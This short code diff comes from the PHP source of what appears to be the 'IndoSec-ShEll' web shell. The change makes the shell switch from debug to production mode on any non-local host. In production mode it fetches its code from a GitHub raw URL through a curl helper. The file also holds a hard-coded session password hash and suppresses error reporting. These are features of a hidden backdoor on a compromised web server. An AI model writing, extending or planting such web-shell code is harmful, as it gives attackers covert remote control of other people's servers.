@@ -48,8 +48,7 @@ error_reporting(0);
 $aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
 $_SESSION["password"] 	= $aupas;
 $isLocal 				= ($_SERVER['HTTP_HOST'] === "localhost" || in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1']));
-// $mode					= $isLocal ? "debug" : "prod";
-$mode = "debug";
+$mode					= $isLocal ? "debug" : "prod";
 $BASE_URL				= $mode === "prod" ? "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main" : "http://localhost/www/percobaan/ids-shell";
 
 function curlRequest($url)
